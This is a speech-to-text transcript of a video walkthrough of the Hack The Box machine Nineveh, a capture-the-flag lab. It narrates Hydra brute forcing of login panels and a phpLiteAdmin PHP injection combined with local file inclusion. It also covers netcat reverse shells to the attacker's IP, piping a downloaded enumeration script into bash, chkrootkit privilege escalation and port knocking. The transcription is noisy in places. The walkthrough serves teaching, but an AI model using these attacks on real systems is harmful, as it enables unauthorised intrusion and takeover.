 what's going on YouTube this is if SEC and we've been doing the 9th of machine from half the box I think the coolest thing this video is going to be the Linux process monitoring script I write as part of the probe ask it should be something that there's a tool for really easy to do but I just don't know how I always fall back to this bash script so that would be in the previous session if you wanted to watch the whole video there's gonna be plenty to learn it has a lot of Hydra usage against login panels it's kind of lackluster for a seat you have to do brute forcing but it's important to know because the amount of times you'll come across a website with weak credentials on an internal network is astounding and if you just keep trying every log in Manly on those it's gonna take you forever do want a Billy assessment so scripting it out really good a lot of Hydra usage that would be good once you get logins to the services there's an exploit chain one an application and care to follow the other applications at lfi and you combine those together you get code execution I think it's possible to get route from here by doing that process monitoring I mentioned earlier but not exactly sure haven't done it from start to finish so that part will be live we'll see if we get root without doing the next part which I find annoying there's a image file with some steganography in that stag is a SSH key and there's also port knockin on this server so it's not listening on port 22 by default once you do a TCP port knock then you can access port 22 so I don't exactly like that part but we'll go over it at the very end of the video how I did the Box when I got first released is that port knockin wasn't applied to ipv6 so I uh busted that SSH key and logged right in over IP v6 it was a lot like the sneaky box but that's been patched ipv6 is disabled so yeah let's jump in first thing first we have to do a port scan in the Box to find out what services are listening and we're gonna be using nmap for that so nmap - SC safe script sv enumerate versions - Oh a output all formats put the direct scans in the directory and map and we'll call them 9v and then the IP address of 9v which is 10 10 10 43 already ran it because it takes some time so let's just look at the results 9v dot and Matt and we see that port 80 and 443 is open it's running Apache to 418 Ubuntu it's got a SSL cert that exposes a hostname 9 v h TB so I'm going to add that into my hosts file just in case it's used so V Etsy host and I've already put this in so 10 10 10 43 9 V dot h TB there that may come in handy later on it may not just good to always navigate by hers names instead of IPS first thing I'm gonna go to the address 10 10 10 43 and we get the Apache it works page I'm gonna go to 9 vh TB and we still get it so there's no host name based routing it's just that my next step would be to be going to the SSL page so see if we get any more host names or things out of that SSL certificate so HTTP 10 10 10 43 and a different page so we'd even do enumeration on that cell cert it's just we know there's a different page being shown to SSL then there is HTTP that's good to know so let's look at that SSL cert anyways to see if there is any other host names going down the list we do get a email address which could also expose a username 9 vh TB which we already knew got the username again as cell cert so anything else there nope so that's about all the information we have we know there's 80 and 443 that's has different pages on the web server and potential user of admin not much information so let's run go Buster against both of them to see if there's any other hidden directories let's create the directory go Buster so we can stay organized and then run go Buster so up it go Buster go Buster - H and look at the we're going to want to use the dash W for word list I'm going to do user share word with doorbuster and directory list lowercase to 3 medium dot text then the next thing we want to specify is - you for the URL and that's gonna be HTTP 10 10 10 43 and then - oh we want to store the this into a file let's do it and go Buster HTTP and d-list lower small dot text that should be fine we're gonna copy this because we want to do it to HTTPS create a new pane from the same thing again except changing it to be HTTPS and the two locations and I forgot we probably want to do - t for threads and oh it's d4 at 10 threads that's fine unable to connect did we take that down Oh invalid certificate let's see go Buster where is the certificate flag pen /no show IP should be a option to ignore SSL cert come on where is it - k I should have tried that first that is curls default there we go so now we ignore certificate on that one we got to go busses running we have a request back on the HTTP side as slash Department so let's see what that is it is a login panel with user name and password on the HTTPS side we had one on / DB and we get PHP light admin and that's an odd warning okay refresh it's gone so you had two different login panels so let's do Hydra against them booth so let's go back there split the pane and we want to do Hydra think the users admin first that's the one we saw on that SSL certificate then - P for passwords it's capital P because we want to do a file instead of just one password I'm going to pass it in to opt no user share word list SEK lists and 10k most common I want to do which is that passwords 10k most common the reason I want to do this is to have rock you just because rock use huge and will take forever to do this should take too long and then after the password list we got specify the IP which is 10 10 10 43 then we want to specify the module of Hydra to use which is HTTP POST forum then we got specify the URL so slash Department slash login dot PHP and this is what gets a little bit tricky let's turn burp on and go to burp proxies intercept do a log in check and then test login we see it passes the username and password in the post so copy this go back to Hydra and replace this with pass and replace username with carrot user carrot and putting the carrot pass all this does is tell Hydra insert the line item out of here to that variable or that section of the URL and then the very last thing we have to do is specify what the page says on a invalid login so let's just for this request go to the page and we get invalid password so I'm just going to put in valid and valid and then we can specify the number of threads will do 64 okay that Hydra has started we press have done some type of output file but we'll do that the next time same thing for this SSL so let's go to PHP light admin just do test intercept is on long again it wants me to accept the certificate okay sure just copy all of this and what I'm gonna do is just change that password to be pass here copy go back paste and we want to go back to this window copy this paste it here we can leave - el admin I think Hydra is going to force us to do a user but if we don't put that carrot user carrot nothing bad happens so leave that there we also want to leave that same password list we're gonna change h-e-b to HTTPS and then the URL is different this is DB / long and dot PHP I believe DB slash index dot PHP and then this cookie or not this but that whole segment is different we have password pass login true step and then what's this say on an invalid login for the quest look at it incorrect so we will put incorrect there instead of invalid 64 thread should be fine and start running that so now I got hydras running go Buster's running and Oh already got a password so let's try login with admin 1 Q 2 W 3 4 10 aricept off admin put that password in and we log into this web page going to I guess if we click logout it logs us out home we're there click on notes and we see how you fix login page yet hard-coded username and password ok check secret folder to get in and improve the database interfaces username right here possibly yeah Royce will going to go to the directory that today androids Apache may be configured to give users their home directory and make their home directory accessible over HTTP and if it is that's how you would normally access it it's not in this case so can't verify that will find my home directory one odd thing to note is this looks like a file path so let's try a Hellfire attack so dot that's last a bunch of times and a file we know exists on the server which is probably at sea passwd try that and get no note was selected so let's send this to burp to make it a bit easier to deal with send that over to repeater go render okay so let's try just getting rid of a few characters and see what happens and we get something interesting it's a error message can we zoom in on this not easily so let's do that over on the web server except off so we get a PHP error message failed to open stream and we get this file name which doesn't exist so that's why it failed to open stream we also see it's using the PHP function include this is important to note because we know if we can get any PHP code there it doesn't matter what extension is it's going to execute that file with PHP if it was like file get contents then it wouldn't automatically execute with PHP but if you put a dot PHP file there you could view the source of a PHP script since it's include it's going to execute everything in between PHP tags so we can't view the source of PHP files however there is a trick it is doing a PHP wrapper I believe so we can do PHP colon slash slash filter slash I think convert dot base64 encode slash resource equals follows 9v dot txt and what this is going to do is it's going to put this string into the include statement and it's going to convert the contents of 9v notes text into base64 and what it does that and no longer execute what's in between PHP tags allowing us to view the source of PHP files and we get foul name too long so cool idea does not work so we have to figure out what files we can view on the server so if we do not even know start text we get it we got one thing that said no note exists and it's odd to see that and then when we do not even notes dot T it gives an error message that's a different thing so let's change nine four notes text to just be nine vertex we'll get rid of notes if we do that we get new note is selected so if we put note back in we get no note selected as it notes yeah it's notes so there's something searching for the string nine notes and if that doesn't exist then it says note doesn't exist so just something you get when you play around with it and unless there's like a nine four notes dot php' or something there then this isn't directly exploitable because we need nine four notes in the name so we go back over into enumeration and just wait for another log into that DB page hopefully so our Hydra command actually didn't come back with any results which is odd it's a really simple password that's just not in that word list so we're gonna do it again but with a different word list and before I do that let us just grep out what the password is out of rock you so we'll grab - I - eyes case-insensitive I'm gonna put the caret password that's gonna grab every line that starts with the word password out of user share word list rock you and when I'm out for that file I guess PW then when a rerun Hydra with PW and see what that password was and once you see the password you're gonna laugh because I assume that password would be in this word list I use of the top 10,000 most common so before this video I knew the more difficult pass where I thought it was that keyboard walk which was 1 Q 2 W 3 looking at the keyboard and you'll find it so I grabbed word list that I thought would be reasonable to use with that password and came back with that 10 K password didn't even bother to check past 1 1 2 3 because I assumed that would be on any list that has a keyboard walk was not so my mistake there let us login to the next service with the password of password 1 2 3 super silly that that wasn't in the word list but oh well logging into PHP Lite admin and we get access to the database and PHP Lite admin is a PHP tool to interact with sequel Lite databases it's very similar to PHP myadmin with my sequel databases sequel Lite is kind of a plain text database system so we can just input PHP code and a table and then if we rename the database to dot PHP we can execute it so there is a exploit DB article I believe that kind of explains it I haven't actually looked for it I knew about this a long time ago and when I was doing the box just never looked so search plate for PHP Lite admin and we see remote PHP code injection so let's take a look at that one search boy - X create a database says rename to PHP and execute code so that is the way if you didn't know about this how you would find it so let's do that so we can just create a new database let's create this with a name of nine notes and we'll give it one field and in this we're going to put some PHP code so I'm going to count up shells PHP CMD dot PHP and just grab this paste that in create actually go back it created done let's drop this I don't know if that's gonna work because I didn't do one thing let's go back and type 9 footnotes number of fields 1 sounds fine and this is just gonna be type as text I don't know if it would create it differently with integer so great this table has been created awesome and then we rename the database and we can name it anything we want so 9 V notes dot PHP rename this database has been renamed so now let's go back to that local file inclusion that we had files and try ver temp 9 for notes dot PHP and add it equals LS it wants us to log in again so user name was admin password I think what key would walk up to five there we go notes paste that in if equals LS we get a syntax error unexpected string it and it's expecting something so something odd happened there what I'm going to do is change the odd characters in my syntax and I'm just trying to find out how to edit this I hate this tool we go here browse how do I just rename a field structure never notes edit there we go and I'm going to change those single quotes to be double quotes because that would work as well and I'm gonna save the changes has been altered successfully run this again and now we get code execution awesome so there was just a weird thing where it didn't save single quotes and the most likely reason is after running this we see it uses single quotes for various things so it's probably doing a escape in that tablespace on single quote and when it did the escape it turned my syntax into why do you do that let's go back edit it structure edit there we go so instead of being this which is valid syntax it put escape characters before the single quotes and made it an invalid command so that's most likely what happened there but now that we have code execution let us send this in to Bert because it's just easy to work with will change the request method into a post make sure this still works send it out doesn't look like it works that way so if we put if we can do a weird hybrid of putting data in a post in the get portion and down below never try this so let's see what happens PHP go yeah it works so the PHP script that gets this variable is getting it via dollar sign get so bring it down here in the post that's dollar sign post like that in my script I do requests so it doesn't matter if it's in the top or bottom but turns out if it's a post request and it's doing a get you can just throw it in where it get is it pass it like that let's double check the Sandy before that's confirmed paste yep so I think that's confirmed behavior today I learned but anyways there we go code execution next thing is we have to get a shell so let's go to pen test monkey first turn burp intercept off and test monkey reverse shell and gonna use the one I use all that time with jizz the one with an C actually before we do that we can just try easy mode and see - see I think Ben - 10 10 14 what's my IP 30 and we'll do 80 80 euro encode this actually not 8080 we'll do 80 90 CL vnp 80 90 go no get rid of that - EEP in bash so we do get a connect it just doesn't have that - e functionality I think it's tachi almost never see that I see that work and my Firefox it's on oh there we go still trying to pull back this one page come on that is going awfully slow let's just go to the Google cache version no returned okay and that is a little trick if you didn't know it if you just do cache colon and a page it'll pull the Google cached version of that page so for websites down could be a easy quick way to return the results so copy this command going to burp paste it's 10:10 1430 port 80 90 you will encode that we are listening go got a shell so first things first always do Python - see and put p 2y p - why not spawn bin bash bertha not film so let's do place on 3 - see and put p 2 y PT y dot spawn and bash oh crap there we go background that sty - a let's get rose and calls ok sty we're off - echo foreground sty rose 49 - i calls 185 now we have a tab autocomplete Abal shell that is really nice and we're going to do a get against let's do enumeration so go into op I think it's Linux Prive ask and I'm going to run that Linney numbness H script so python - m simple HTTP server 8000 over here curl 1010 1430 win and noms sh gets the script awesome we can pipe that over to bash and it executes and once that's done running we'll go to the very top and examine anything we see guess we can go to the top now while it's running and look at it you know there we go so we see colonel was updated and 2017 so it's been updated this year GCC Ubuntu 1604 for that is zhenya lye believe ya zhenya l' going down or running as the www user there is a log in from M rice down we can go into the hemorrhoids directory on the home so we can see what's in there looking at Cron's I don't see anything too out of place everything looks like it's standard IP address is no ipv6 let us go back there whoops there we go you know there we go nope that goes all the way up just trying to get to where I left off which was an IP address there we go networking info left off up history it's not talking to anything listening TCP that is odd seeing SSH listening on localhost so I say CH is listening it didn't show up in our end map scan so that's something to investigate we'll go into that at the very end of the video that's where the port knockin comes in there's looking at all the processes binaries I don't think there's anything else of interest one thing to note that I forgot to show is when we were in that PHP light database the reason why we didn't just try writing to a web directory was because I knew ahead of time nothing is writable by w WDS so we had to write into for a temp or a slash temp or something like that so that was that reason if it there was a space like slash uploads that you could write in I think you just place the database there then navigate to it you don't need that LF I so hopefully that makes sense sorry I jumped over that there's only so much you can explain when you're doing it kind of live like this so we do a LS on slash we see a odd directory slash report that I'm not used to saying so let's go into that directory and we see a file being created every minute so it's hard to see what creates that file we know it's probably a cron job so let's write a script to do that and the very first thing I want to do is show two commands we have PSEO command and that's going to list all the things that are running on the web server right on the server it doesn't have to be web and then there's something called ifs variable that is I think internal field separator so if we just did a loop on this it's going to the field separator by default is space so that loop is going to use space as the separator if we set ifs to that and say hey don't separate based upon space separate based upon new line and then run the same command it's now looping by line so that's key to know so go into our attempt and we're going to create a script so proc ma SH do the shebang at the top so we can make it executable easily we have to set ifs to backslash N and the reason for that is loop by line so put a comment there loop by line then whoops if I could type man next thing I want to do is hold process is equal to the sto command that's what I just showed you the output of and then we want to create a infinite loop so while true do and we'll do new process is equal to the same thing that should work then after that we want to diff two variables and this is how we do that I don't know why didn't put this in double quotes I don't think I need the double quotes there but just because I did on that second one stay consistent and I'm going to grep this for two lines if it contains either those two cases I just typed show me the results and the reason is diff just shows some weird hex characters after a match so and then sleep one and we want hold process is equal to new process and done so what this is going to do is it's going to grab a list of every process that's running and then grab a list of every new process that's running diff the two results and that's going to show us when things enter or leave this new process list and sleep a second and repeat so let's try that out chmod plus x rockman Sh execute it and we wait we know that a cron runs every minute so it should give us a result and we should see processes starting and ending if we want we probably could just go to the web page and it should come up I know that's not loading or if this just froze the server shouldn't have but Apache okay patch is running just didn't like that command I was doing Oh odd documentation goes there let's go to a page yeah maybe Apache frozen that was a cash thing refresh no PHP just looks like it's hung that's odd maybe I screwed something up let's look at the script as it's going to go oh no no that should be fine huh then bash loop byline old process PSEO command PSEO command diff let's just get rid of that grep will see the junk oh I'm an idiot old process new process that's what I forgot I have an idiot now this should work and there we go perfect timing so that's the junk I was filtering out with my grep is that that comes in diff but we can see that cron started cron executed /root von scan SH that with bin Sh it was alias to bash so then bash executes and then it executes use a bin check rootkit and then that does a find so if we look at user bin check rootkit I can't open LS - la ok we can only execute it maybe not let's just do a search boy for a CH k rootkit and I think I forgot to show you the contents of one of those report files so we'll show that real quick it just runs check rootkit and it checks for exploits on the server funnily enough it suspects my PHP file is something of malicious intent which it is so kudos to it but if we search point for chk rootkit and we have to do that on our Linux host we do get privilege escalations and this is quite a bit terrine but just know it executes slash temp slash update because that's what puts an update file so if we just put create that file / tab what can we put an update the update dual-band bash and I guess we'll give ourselves a shell reverse shell cheat sheet 1010 1430 we'll leave it at port 1 2 3 4 temp F would do temp 2 instead we don't want to delete temp F because a first shell exists on that so change all references to temp 2 search for F and just go make sure it doesn't exist anymore there we go then chmod plus x update good a new and CLV NP 1 2 3 4 date we got wait 45 seconds so I'll actually send that to Payne 3 I think now send a pain to and in temp I'll check the date again so in about 20 seconds it should go over temp dot slash pokémon start listening for processes again and probably in 15 seconds we should see that kromm start up and if we did it correctly it should execute an update and send us a shell so we'll see if that happens and should be happening now I think there we go and got a shell and we also see funnily enough additional processes started so we see that bin bash temp update that's it executing the update file then this portion is my reverse shell so if we do a Who am I we are now route so that is how you can route the box without ever getting to that one user I guess now we have to do the whole intended route with port knockin so let's just actually go back to the enumeration pane and we see that go bust have finished and found another directory we haven't looked at which is secure underscored notes so let's check that out and we get a image so let's save this image move the image into a currently current directory and then I just then walk the image to see if there's any heading content and we see there is a archive and Zeeland compressed data so this is probably a gzip inside the image so what we're going to do is in walk - capital M II on that image the e/m just means it's going to extract read run bin walk for everything in extracts so we see it's extracted several things do it LS extract - underscored 9 V look in this directory there's a tar archive it extracted that folders called secret and we see a pub and Prive file so if we cat the pub we see it's the public SSH key for the M Roy's user if week at the Prive it is the SH key for the privileged user so let's try to SSH with it chmod 600 because CH SH needs that - i 9v approve the IP address 1010 10:43 user was a.m. or o is and nothing checking this was still connected and that is because again remember and map didn't return anything hardly enough when we're doing the local enumeration it did so what we have here is port knockin and we're going to go back into burp will do this pretending we don't have a shell where's a code execution here it is so if we do LS here oh that's right PHP song I think it's actually a script that we ran that hung PHP so I guess we have to go back into script we'll just do this from the www data user so we'll pretending we're doing command injection so if we again netstat a LNP grep for listening we see 4:22 is listening and that was funny if you heard that that was siri going off my phone thought I said something but my apologies for that SSH says it's open but a box says it's not if we look into the IP tables so that's Etsy IP tables we can do rules dot v4 and we see that it's accepting on port 80 and 443 then dropping we can't just look at the active rules because we don't have mission 2 but we can look at this file so we know there's an IP tables rule blocking 80 and 443 and because it's the CTF we have to make use of that public key somehow and the answer is there is a port knocking service so I think if we go to Etsy Amit dee do it LS and look at the services here we see NOC D so if we les the NOC D service we can find its config file I think as Etsy default NOC D so let's take a look there seasteading NOC D and it's config file is Etsy NOC decom and here we go we have IP tables let's see if we do the port's 571 290 then 9 1 1 it's going to allow us access via port 22 so save that going to bash for I and let´s do echo I done I have fast equals I want to loop by space again I thought that would do it that know how do I not put these in quotes is that how yeah okay so have the port knock we just had to send a TCP packet - there's three ports so easiest way to do that is dev TCP IP address port so I can show you real quick let's do Python - um actually we'll just neck at LV NP on four eights and if we do echo nothing - dev TCP one 27001 four eights actual that go test we see it sends the string test to that socket so that's the easiest way I know to do port talking so let's just echo nothing - dev TCP 10 10 10 43 and then I did I screw something up and it's likely I did because it wants the sockets opening and not closing maybe huh echo nothing dev TCP 10-10-10 43 571 yeah $2.99 1 1 that's just because I guess the server's not closing the socket or something that's odd but now let's do and Matt - p22 10/10 10:43 filtered maybe it doesn't work that way let's try backup strategy instead of doing it that way will do and map - capital P and I SP I st for TCP and the IP address is 10 10 10 43 try this 531 filter 290 filtered 9-1-1 filtered and 22 is still filtered what knock when I screwed something up it's part of the max retries so copy those two flags paste try this again there we go now it's open so the issue probably was that maths retries flag because M map probably tried port 571 multiple time so it was like five seven one five seven one two ninety two ninety nine one one nine one one and that caused it to err and needed to be in that exact order so now that SSH is open we can do shi 9vy Prive and M Royce at ten ten ten forty three and we log in so again when this box first was launched ipv6 was wide open that port NOC service was only on ipv4 and you could just do it right away but ipv6 got disabled so the previous from here the same way we did with WWD the only thing different is the Lenny Nam script would appointee due to user SP and report dot SH and you could see that script and all it did was clear that slash report directory so all we had to do with www.exim.gov IDEO take care and um I don't know if there's gonna be retired machines for the next two weeks because the holidays but I may do phone hub or just have to start working on calamity because that is going to be a tough video but happy holidays everyone take care